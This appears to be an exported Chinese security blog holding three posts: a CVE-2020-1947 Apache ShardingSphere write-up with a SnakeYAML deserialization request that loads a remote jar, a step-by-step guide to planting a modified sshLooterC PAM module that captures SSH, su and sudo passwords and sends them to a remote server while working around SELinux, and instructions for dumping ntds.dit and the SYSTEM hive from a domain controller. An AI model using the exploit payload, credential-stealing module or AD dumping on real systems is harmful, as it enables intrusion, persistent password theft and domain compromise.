    <url>/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/D076B92F-FC4E-4E1A-BF46-05C177B089B6.png" alt="1fa05c10bac6777c80d6a9dd02ac9104"><br>最近看到CVE-2020-1947的漏洞公告和相关漏洞预警文章，但文章经过各种打码和遮掩，让人摸不着头发。于是决定从环境搭建到漏洞利用都实际操作一遍。</p>
<h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Apache ShardingSphere(Incubator) 是一套开源的分布式数据库中间件解决方案组成的生态圈，它由Sharding-JDBC、Sharding-Proxy和Sharding-Sidecar（规划中）这3款相互独立，却又能够混合部署配合使用的产品组成。它们均提供标准化的数据分片、分布式事务和数据库治理功能，可适用于如Java同构、异构语言、云原生等各种多样化的应用场景。</p>
<h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h1><ul>
<li>Apache ShardingSphere &lt; 4.0.1</li>
</ul>
<h1 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h1><h2 id="安装Sharding-UI"><a href="#安装Sharding-UI" class="headerlink" title="安装Sharding-UI"></a>安装Sharding-UI</h2><p>从官网下载v4.0.0版本的Sharding-UI：<br><a href="https://shardingsphere.apache.org/document/current/cn/downloads/" target="_blank" rel="noopener">https://shardingsphere.apache.org/document/current/cn/downloads/</a><br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06154568-7924-463F-9701-38D3E382174E.png" alt="1f63a817a514a8cd564a49026c4034d9"><br>运行bin目录下的start.sh即可。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/221E4A86-75F8-4C86-8172-F0E3E3DA0A3A.png" alt="2e38736c629f719b222a5c5a85e9e217"><br>然后访问<code>http://localhost:8088/</code>,默认账号密码<code>admin/admin</code>，即可登录。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1BE3739D-7AA4-45F5-AD4D-9DE511FEE16A.png" alt="731293d1f4c263ee1f32d8c89e382b6c"><br>顺带一提，在<code>conf/application.properties</code>中存储了WEB端的端口和账号密码。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8AF8C830-959F-4194-B70F-34FEACE81A9A.png" alt="8f7bf3ea5b72138e7fbe858392a7ce97"></p>
<h2 id="安装Zookeeper"><a href="#安装Zookeeper" class="headerlink" title="安装Zookeeper"></a>安装Zookeeper</h2><p>要想成功利用，需要先在Sharding-UI中添加一个注册中心，否则在后续利用中会提示<code>No activated registry center!</code>，所以需要搭建一个Zookeeper。<br>这里直接使用docker搭建Zookeeper，并且将2181端口映射出来到本地的2181端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull zookeeper</span><br><span class="line">docker run --privileged&#x3D;true -d --name zookeeper --publish 2181:2181  -d zookeeper:latest</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/858FB2FE-D704-4A33-8368-A0D5ED4E1FD1.png" alt="1009d6d66a5e5c84e0e2b894f7ef60c7"></p>
<h2 id="配置registry-center"><a href="#配置registry-center" class="headerlink" title="配置registry-center"></a>配置registry-center</h2><p>在Sharding-UI的registry-center模块配置Zookeeper的地址。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/345409E8-059D-46A7-8F64-1BA3CB3C765C.png" alt="d7db80b9a18839ce9a2b80584f294381"><br>成功连接即可。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7F9F6DFF-47BB-445C-A012-D033651A78AE.png" alt="8f1fbdf5258557d1ca477ed5b7497ea9"></p>
<h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><p>利用前提：<br>一个能够登录Sharding-UI的账号，默认<code>admin/admin</code></p>
<h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p>使用SnakeYAML反序列化小工具：<br><a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a><br>修改<code>src/artsploit/AwesomeScriptEngineFactory.java</code>文件，设置为弹出计算器。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/E1866BE3-F5FA-408D-AEA4-A8BC753D3FEE.png" alt="922ab35edfb9bc310f98b4bf8fdc458a"><br>编译生成jar包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src&#x2F; .</span><br></pre></td></tr></table></figure>
<p>然后使用python本地搭建HTTPServer，等待连接。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 90</span><br></pre></td></tr></table></figure>

<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>在web端的Rule Config——&gt;Add Schema处加入YAML代码并提交。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/A58D2E57-269C-46D0-85ED-B6E3457F9C00.png" alt="41702291918347ff86d54ae1c4ce6f84"><br>数据包正文：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;test&quot;,&quot;ruleConfiguration&quot;:&quot;encryptors:\n    &lt;encryptor-name&gt;:\n      type: MD5\n      props:&quot;,&quot;dataSourceConfiguration&quot;:&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http:&#x2F;&#x2F;localhost:90&#x2F;yaml-payload.jar\&quot;]]]]&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>发送即可成功弹出计算器。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/66FC8C11-22D0-4034-B53F-6ADE8B73C815.png" alt="a795d00ca68e424e2e702a7d3c133fb9"></p>
<h1 id="0x05-漏洞分析"><a href="#0x05-漏洞分析" class="headerlink" title="0x05 漏洞分析"></a>0x05 漏洞分析</h1><p>请求<code>/api/schema</code>对应<code>src/main/java/org/apache/shardingsphere/ui/web/controller/ShardingSchemaController.java</code>中的<code>addSchema</code>方法。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/21576AB8-AD19-4938-849B-E1A8DFD1C18F.png" alt="6abb08c39d1ca1c9b3427b06d24d6556"><br>将POST正文中的参数传入<code>ShardingSchemaService</code>接口的<code>addSchemaConfiguration</code>方法。该方法在<code>src/main/java/org/apache/shardingsphere/ui/servcie/impl/ShardingSchemaServiceImpl.java</code>被实现。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/23CF7E5A-0848-4521-A9B5-6A1318073628.png" alt="a741e74540cac0b5eed7c2e7a1f3713a"><br>这里将POST请求中的<code>dataSourceConfiguration</code>的值作为字符串传入<code>checkDataSourceConfiguration</code>方法，该方法继续将字符串传入<code>loadDataSourceConfigurations</code>方法。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9FFDE6C3-E2ED-47C0-917D-4C938581065B.png" alt="68bbfff9de0bda322f14fdeaa75ec4cc"><br>终于到了漏洞文章中提到的<code>unmarshal</code>方法。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/E502EAFF-B3EE-44F7-81E0-5971859B2FC8.png" alt="91dfd123ce40103a420bbbebb0df2da0"><br><code>org.apache.shardingsphere.core.yaml.engine.YamlEngine</code>类中的<code>unmarshal()</code>方法使用<code>snakeyaml</code>中的<code>Yaml.load()</code>对未经过任何过滤的YAML数据进行解析,从而触发YAML反序列化。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5F16C7F8-1EE9-458D-87AF-02EF8F9E0D41.png" alt="4572323e8364a2f0c57e1574b53b8cde"><br>完整调用流：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ShardingSchemaController.addSchema()</span><br><span class="line">——&gt;shardingSchemaService.addSchemaConfiguration()</span><br><span class="line">——&gt;ShardingSchemaServiceImpl.checkDataSourceConfiguration()</span><br><span class="line">——&gt;ConfigurationYamlConverter.loadDataSourceConfigurations()</span><br><span class="line">——&gt;YamlEngine.unmarshal()</span><br><span class="line">——&gt;Yaml.load()</span><br></pre></td></tr></table></figure>


<p>最后值得一提的是，EXP中特意设置了<code>ruleConfiguration</code>的值为<code>encryptors:\n    &lt;encryptor-name&gt;:\n      type: MD5\n      props:</code>，是因为<code>checkRuleConfiguration</code>方法会对<code>ruleConfiguration</code>的值进行解析，如果不符合指定格式，则触发异常，服务端返回<code>rule configuration is invalid</code>。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/41D8F0CD-699D-4272-8E3D-E1679FAABB18.png" alt="4cad4f404073f387e039562093ff9e74"><br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/808C605B-2035-4B6F-9AF3-515D254182E3.png" alt="3e00f428c3faff046efbbc308a0fc2e5"></p>
<h1 id="0x06-漏洞防护"><a href="#0x06-漏洞防护" class="headerlink" title="0x06 漏洞防护"></a>0x06 漏洞防护</h1><ol>
<li><p>更新应用版本。在最新的V4.0.1中加入了ClassFilterConstructor()进行白名单校验。<br><img src="/2020/05/04/CVE-2020-1947-ApacheShardingSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8B382F6E-8D80-438A-8945-C196F915F88B.png" alt="4f1427e026ab65e1a0d52f052f1c1c69"></p>
</li>
<li><p>修改<code>sharding-ui/sharding-ui-backend/src/main/resources/application.properties</code>中的默认账号密码，并且重启服务。</p>
</li>
</ol>
<h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ol>
<li><a href="https://mp.weixin.qq.com/s/1vmXLZ_Dn7_BLDtSlj07Cw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1vmXLZ_Dn7_BLDtSlj07Cw</a></li>
<li><a href="https://www.anquanke.com/post/id/200554" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200554</a></li>
<li><a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></li>
</ol>
<h1 id="更新信息"><a href="#更新信息" class="headerlink" title="更新信息"></a>更新信息</h1><table>
<thead>
<tr>
<th>修订时间</th>
<th>修订人</th>
<th>简述</th>
</tr>
</thead>
<tbody><tr>
<td>2020.03.11</td>
<td>3t2ugg1e</td>
<td>创建文章</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>PAM劫持SSH密码</title>
    <url>/2020/05/04/PAM%E5%8A%AB%E6%8C%81SSH%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用strace来获取ssh密码的方法并不是100％有效的，因为strace的输出在不同linux发行版上会发生变化，需要有针对性的写匹配规则，于是乎就找到了另一种方法PAM劫持SSH密码。参考链接在最后。</p>
<h1 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>下载sshLooterC项目：<br><a href="https://github.com/mthbernardes/sshLooterC" target="_blank" rel="noopener">https://github.com/mthbernardes/sshLooterC</a></p>
<p>编译时需要安装依赖。<br>Centos7：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install curl-devel pam-devel</span><br></pre></td></tr></table></figure>

<p>Ubuntu16：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y libcurl4-openssl-dev libpam0g-dev</span><br></pre></td></tr></table></figure>

<p>源项目代码里有一些Bug，需要修改一下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PAM_EXTERN <span class="keyword">int</span> <span class="title">pam_sm_authenticate</span><span class="params">( <span class="keyword">pam_handle_t</span> *pamh, <span class="keyword">int</span> flags,<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv )</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> retval;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* username;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* password;</span><br><span class="line">  <span class="keyword">char</span> message[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">char</span> hostname[<span class="number">128</span>];</span><br><span class="line">  retval = pam_get_user(pamh, &amp;username, <span class="string">"Username: "</span>);</span><br><span class="line">  <span class="comment">//该无法正常获得密码</span></span><br><span class="line">  pam_get_item(pamh, PAM_AUTHTOK, (<span class="keyword">void</span> *) &amp;password);</span><br><span class="line">  <span class="keyword">if</span> (retval != PAM_SUCCESS) &#123;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">  &#125;</span><br><span class="line">  gethostname(hostname, <span class="keyword">sizeof</span> hostname);</span><br><span class="line">  <span class="built_in">snprintf</span>(message,<span class="number">2048</span>,<span class="string">"Hostname: %s\nUsername %s\nPassword: %s\n"</span>,hostname,username,password);</span><br><span class="line">  sendMessage(&amp;message);</span><br><span class="line">  <span class="keyword">return</span> PAM_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改为一下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pam_get_authtok</span><span class="params">(<span class="keyword">pam_handle_t</span> *pamh, <span class="keyword">int</span> item, <span class="keyword">const</span> <span class="keyword">char</span> **authtok, <span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">PAM_EXTERN <span class="keyword">int</span> <span class="title">pam_sm_authenticate</span><span class="params">( <span class="keyword">pam_handle_t</span> *pamh, <span class="keyword">int</span> flags,<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv )</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> retval;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* username = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* password = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* prompt = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">char</span> message[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">char</span> hostname[<span class="number">128</span>];</span><br><span class="line">  retval = pam_get_user(pamh, &amp;username, <span class="string">"Username: "</span>);</span><br><span class="line">  <span class="comment">//获得密码</span></span><br><span class="line">  pam_get_authtok(pamh, PAM_AUTHTOK, &amp;password, prompt);</span><br><span class="line">  <span class="keyword">if</span> (retval != PAM_SUCCESS) &#123;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">  &#125;</span><br><span class="line">  gethostname(hostname, <span class="keyword">sizeof</span> hostname);</span><br><span class="line">  <span class="built_in">snprintf</span>(message,<span class="number">2048</span>,<span class="string">"Hostname: %s\nUsername: %s\nPassword: %s\n"</span>,hostname,username,password);</span><br><span class="line">  sendMessage(&amp;message);</span><br><span class="line">  <span class="keyword">return</span> PAM_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，由于本土特色，正常是无法访问telegram的，所以需要自定义一下服务端。<br><img src="/2020/05/04/PAM%E5%8A%AB%E6%8C%81SSH%E5%AF%86%E7%A0%81/AB0E9C04-9772-4A63-A8DB-56F3AE4A0ADD.png" alt="94bdc4fb4f3ff226ffd3601337f78c44"></p>
<p>使用make编译，生成looter.so即可，该so文件ubuntu和centos上是通用的。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="Ubuntu16"><a href="#Ubuntu16" class="headerlink" title="Ubuntu16"></a>Ubuntu16</h3><p>将looter.so存放到<code>/lib/x86_64-linux-gnu/security/</code>目录下。<br>修改<code>/etc/pam.d/common-auth</code>文件，将<code>auth optional looter.so</code>添加到<strong>文件末尾</strong>。如果不添加到文件末尾的话，你就会发现你的SSH能成功登录，但是图形界面就登不进去了，即使密码正确 :( 。配置结果如图：<br><img src="/2020/05/04/PAM%E5%8A%AB%E6%8C%81SSH%E5%AF%86%E7%A0%81/3726D8B7-7DC6-498B-90EE-C33CD3448850.png" alt="2a3c7bfd6660420fd036bfca786bac69"></p>
<h3 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h3><p>将looter.so存放到<code>/usr/lib64/security/</code>目录下。<br>需要同时修改<code>/etc/pam.d/password-auth</code>和<code>/etc/pam.d/system-auth</code>，将<code>auth optional looter.so</code>添加到<strong>文件开头</strong>。<br>然后非常关键的一步操作（做实验时，不知道有SELinux这个机制，差点又自闭了）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#临时设置SELinux成为permissive模式，重启后失效</span><br><span class="line">setenforce 0</span><br><span class="line"></span><br><span class="line">#显示SELinux的当前模式</span><br><span class="line">getenforce</span><br><span class="line"></span><br><span class="line">#或者修改&#x2F;etc&#x2F;selinux&#x2F;config，永久生效，需要重启机器</span><br><span class="line">SELINUX&#x3D;disabled</span><br></pre></td></tr></table></figure>

<p>这时可能会有小伙伴来问了，怎么不关闭SElinux，成(zi)功(ji)劫(zhe)持(teng)呢？<br>我早就猜到会有小伙伴这样问了（不，只有我会？？？）</p>
<p><strong>解决方法：</strong><br>修改looter.so的SELinux上下文，将文件类型修改为lib_t（so文件类型限制）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chcon -t lib_t &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;looter.so</span><br><span class="line"></span><br><span class="line">#顺带一提，查看文件类型的命令</span><br><span class="line">ls -Z &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;looter.so</span><br></pre></td></tr></table></figure>

<p>从以下命令列出来的端口中，选择一个作为服务端的通信端口(端口安全限制)，我这里选择了25151端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">semanage port -l</span><br></pre></td></tr></table></figure>

<p>生成本地策略模块以允许sshd name_connect 访问 port 25151 tcp_socket（通信策略限制）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ausearch -c &#39;sshd&#39; --raw | audit2allow -M my-sshd</span><br><span class="line">semodule -i my-sshd.pp</span><br></pre></td></tr></table></figure>

<p>对SELinux安全机制感兴趣的，推荐给你们一个用户指南：<br><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security-enhanced_linux/index" target="_blank" rel="noopener">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security-enhanced_linux/index</a></p>
<h2 id="劫持"><a href="#劫持" class="headerlink" title="劫持"></a>劫持</h2><p>最终效果如图：<br>不止ssh登录时会被记录密码，su、sudo等命令都是可以记录的。<br><img src="/2020/05/04/PAM%E5%8A%AB%E6%8C%81SSH%E5%AF%86%E7%A0%81/AE1EEC15-93AA-4A07-8A02-C86550626510.png" alt="73e6312815aea94a0660783b2dbc8f2a"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>解决错误的小技巧（避免自闭的小技巧？？？）：</p>
<ol>
<li>无法在Centos成功执行的时候，可使用strace劫持sshd进程，查看报错信息，可以定位到一部分问题。<br><img src="/2020/05/04/PAM%E5%8A%AB%E6%8C%81SSH%E5%AF%86%E7%A0%81/34BA3572-1ACF-462A-AFA8-9734E507547F.png" alt="147402957ff992a05b022c99ba72e47d"></li>
<li>感谢SELinux警报浏览器，成功拯救了一个即将自闭的少年（能把报错详细信息和处理建议写出来，真的是太让人感动了）。<br><img src="/2020/05/04/PAM%E5%8A%AB%E6%8C%81SSH%E5%AF%86%E7%A0%81/B45EECDB-21DB-4202-BB27-7318DD80EFE8.png" alt="a862af545782930967f3b803460d0396"></li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html" target="_blank" rel="noopener">https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html</a></li>
<li><a href="https://github.com/mthbernardes/sshLooter" target="_blank" rel="noopener">https://github.com/mthbernardes/sshLooter</a></li>
<li><a href="https://github.com/mthbernardes/sshLooterC" target="_blank" rel="noopener">https://github.com/mthbernardes/sshLooterC</a></li>
</ol>
<h1 id="更新信息"><a href="#更新信息" class="headerlink" title="更新信息"></a>更新信息</h1><table>
<thead>
<tr>
<th>修订时间</th>
<th>修订人</th>
<th>简述</th>
</tr>
</thead>
<tbody><tr>
<td>2020.05.01</td>
<td>3t2ugg1e</td>
<td>创建文章</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>WireShark解密KRB5中的enc-part</title>
    <url>/2020/05/04/WireShark%E8%A7%A3%E5%AF%86KRB5%E4%B8%AD%E7%9A%84enc-part/</url>
    <content><![CDATA[<h1 id="0x01-需求"><a href="#0x01-需求" class="headerlink" title="0x01 需求"></a>0x01 需求</h1><p>kerberos协议学习中，使用WireShark解密KRB5中的enc-part部分，获得TGT和TGS详情。<br><img src="/2020/05/04/WireShark%E8%A7%A3%E5%AF%86KRB5%E4%B8%AD%E7%9A%84enc-part/052A055D-8A21-472D-A4C1-44EA33EB38B2.png" alt="0e9c620c1c293b04578093023806155b"></p>
<h1 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h1><h2 id="ntds-dit和system-hive"><a href="#ntds-dit和system-hive" class="headerlink" title="ntds.dit和system.hive"></a>ntds.dit和system.hive</h2><p>首先在域控上使用ntdsutil方法导出ntds.dit和system.hive。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full C:\ntdsutil</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/04/WireShark%E8%A7%A3%E5%AF%86KRB5%E4%B8%AD%E7%9A%84enc-part/B1D01520-0E0F-4CFB-AE01-A90561B3D0F9.png" alt="ede4e38ecb8a4fb2cc9e256ed3e62130"></p>
<p>获得活动目录数据库（ntds.dit）和解密密钥（system.hive）.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\ntdsutil\Active Directory\ntds.dit</span><br><span class="line">C:\ntdsutil\registry\SYSTEM    &#x2F;&#x2F;该文件就是system.hive</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/04/WireShark%E8%A7%A3%E5%AF%86KRB5%E4%B8%AD%E7%9A%84enc-part/E49B2B77-E239-4097-97D9-B3314558A811.png" alt="d65b1ba194435087cfe29d515d457c15"></p>
<h2 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h2><p>Kali安装依赖。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install autoconf automake autopoint libtool pkg-config</span><br></pre></td></tr></table></figure>
<p>下载esedbexport。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;libyal&#x2F;libesedb&#x2F;releases&#x2F;download&#x2F;20191220&#x2F;libesedb-experimental-20191220.tar.gz</span><br><span class="line">tar xf libesedb-experimental-20191220.tar.gz</span><br><span class="line">cd libesedb-20191220</span><br></pre></td></tr></table></figure>
<p>安装esedbexport。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
<p>从ntds.dit中提取出表。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure>
<p>提取完成后，会创建一个<code>ntds.dit.export</code>目录存放提取的内容。<br><img src="/2020/05/04/WireShark%E8%A7%A3%E5%AF%86KRB5%E4%B8%AD%E7%9A%84enc-part/D1051D0F-7635-4815-87BA-54E7D8AD142B.png" alt="d74f3c7862d654dfd05d3ad6acf4f903"></p>
<h2 id="ntdsxtract"><a href="#ntdsxtract" class="headerlink" title="ntdsxtract"></a>ntdsxtract</h2><p>安装ntdsxtract。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;csababarta&#x2F;ntdsxtract.git</span><br><span class="line">cd ntdsxtract&#x2F;</span><br><span class="line">sudo python setup.py build</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
<p>使用ntdsxtract中的dskeytab.py提取<code>ad.keytab</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dskeytab.py ..&#x2F;ntds.dit.export&#x2F;datatable.4 ..&#x2F;ntds.dit.export&#x2F;link_table.7 ..&#x2F;SYSTEM ..&#x2F; ..&#x2F;ad.keytab</span><br></pre></td></tr></table></figure>
<p>工具用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dskeytab.py &lt;datatable&gt; &lt;linktable&gt; &lt;system hive&gt; &lt;work directory&gt; &lt;keytab&gt;</span><br></pre></td></tr></table></figure>
<h2 id="导入keytab"><a href="#导入keytab" class="headerlink" title="导入keytab"></a>导入keytab</h2><p>打开Wireshark——&gt;Preferences——&gt;Protocols——&gt;KRB5。<br>导入刚才生成的ad.keytab，并且勾选<code>Try to decrypt Kerberos blobs</code>.<br><img src="/2020/05/04/WireShark%E8%A7%A3%E5%AF%86KRB5%E4%B8%AD%E7%9A%84enc-part/4A28EF99-2D39-4FD2-BC81-F0226D04F4A1.png" alt="850e8c28aa35ec31b33b6b4d771c3a72"><br>成功解密TGT和TGS。<br><img src="/2020/05/04/WireShark%E8%A7%A3%E5%AF%86KRB5%E4%B8%AD%E7%9A%84enc-part/5258551B-227A-4C85-8235-14B58514DEB7.png" alt="acfc0030c939805aec6c34b7aa677858"></p>
